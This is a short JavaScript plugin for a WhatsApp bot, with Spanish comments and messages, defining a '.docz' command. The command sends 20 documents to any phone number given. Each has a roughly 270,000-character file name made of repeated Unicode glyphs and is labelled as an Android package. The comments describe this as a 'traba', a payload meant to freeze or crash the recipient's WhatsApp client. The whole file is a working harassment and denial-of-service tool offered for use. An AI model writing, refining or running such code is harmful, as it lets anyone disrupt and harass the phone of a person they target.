let handler = async (m, { conn, text }) => {
  if (!text || !text.startsWith('+')) {
    return m.reply('❌ Especifica un número válido.\nEjemplo: *.docz +525521234567*');
  }

  const numero = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

  // Traba invisible con millones de caracteres
  const basura = '𑇂𑆵𑆴𑆿'.repeat(90000); // Puedes aumentar
  const fileName = basura + basura + basura; // 270,000 caracteres

  for (let i = 0; i < 20; i++) {
    await conn.sendMessage(numero, {
      document: { url: 'https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf' },
      fileName: fileName + '.apk',
      mimetype: 'application/vnd.android.package-archive',
      caption: '🔥 Documento generado por Tobi',
    }, { quoted: m });
  }

  await m.reply(`📄 Se enviaron 20 documentos pesados como traba a ${text}`);
};

handler.command = ['docz'];
handler.tags = ['bug', 'tools'];
handler.help = ['docz <+número>'];
export default handler;